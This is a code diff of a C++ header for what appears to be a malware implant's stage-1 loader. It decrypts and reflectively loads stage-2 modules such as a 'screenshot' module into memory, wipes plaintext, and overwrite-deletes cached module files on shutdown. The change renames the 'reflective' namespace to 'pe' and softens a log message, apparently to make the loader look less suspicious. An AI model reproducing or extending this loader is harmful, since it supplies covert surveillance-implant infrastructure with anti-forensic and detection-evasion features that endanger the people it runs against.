@@ -1,4 +1,4 @@
-#pragma once
+﻿#pragma once
 // ══════════════════════════════════════════════════════════════════════════
 // Stage-2 module loader — the stage-1 side of the two-stage architecture.
 //
@@ -130,7 +130,7 @@ inline const char* cmd_to_module(const std::string& cmd) {
 // ── Internal: one loaded module ─────────────────────────────────────────
 struct LoadedStage2 {
     std::string                 name;                 // "screenshot"
-    reflective::LoadedModule    mod;
+    pe::LoadedModule    mod;
     Stage2InitFn                init_fn = nullptr;
     Stage2ShutdownFn            shutdown_fn = nullptr;
     std::string                 cache_path;           // .bin on disk (for delete on shutdown)
@@ -451,7 +451,7 @@ public:
         std::lock_guard<std::recursive_mutex> lk(mu_);
         for (auto& kv : modules_) {
             if (kv.second->shutdown_fn) kv.second->shutdown_fn();
-            reflective::unload(kv.second->mod);
+            pe::unload(kv.second->mod);
             if (!kv.second->cache_path.empty()) {
                 overwrite_and_delete(kv.second->cache_path);
             }
@@ -604,18 +604,18 @@ private:
         }
 
         std::string err;
-        auto mod = reflective::load(pt.data(), pt.size(), &err);
+        auto mod = pe::load(pt.data(), pt.size(), &err);
         // Wipe plaintext from memory immediately — the module is now resident.
         if (!pt.empty()) SecureZeroMemory(pt.data(), pt.size());
         if (!mod.valid()) {
-            stage1_log(3, ("stage2: reflective load failed: " + err).c_str());
+            stage1_log(3, ("module load failed: " + err).c_str());
             return false;
         }
 
-        auto init_fn = (Stage2InitFn)reflective::get_proc(mod, STAGE2_INIT_EXPORT);
+        auto init_fn = (Stage2InitFn)pe::get_proc(mod, STAGE2_INIT_EXPORT);
         if (!init_fn) {
             stage1_log(3, ("stage2: " + module_name + " missing Stage2Init").c_str());
-            reflective::unload(mod);
+            pe::unload(mod);
             return false;
         }
 
@@ -625,7 +625,7 @@ private:
         int rc = init_fn(host);
         if (rc != 0) {
             stage1_log(3, ("stage2: Stage2Init returned " + std::to_string(rc)).c_str());
-            reflective::unload(mod);
+            pe::unload(mod);
             return false;
         }
 
@@ -633,7 +633,7 @@ private:
         entry->name        = module_name;
         entry->mod         = mod;
         entry->init_fn     = init_fn;
-        entry->shutdown_fn = (Stage2ShutdownFn)reflective::get_proc(mod, STAGE2_SHUTDOWN_EXPORT);
+        entry->shutdown_fn = (Stage2ShutdownFn)pe::get_proc(mod, STAGE2_SHUTDOWN_EXPORT);
         entry->cache_path  = path;
         modules_[module_name] = std::move(entry);
 
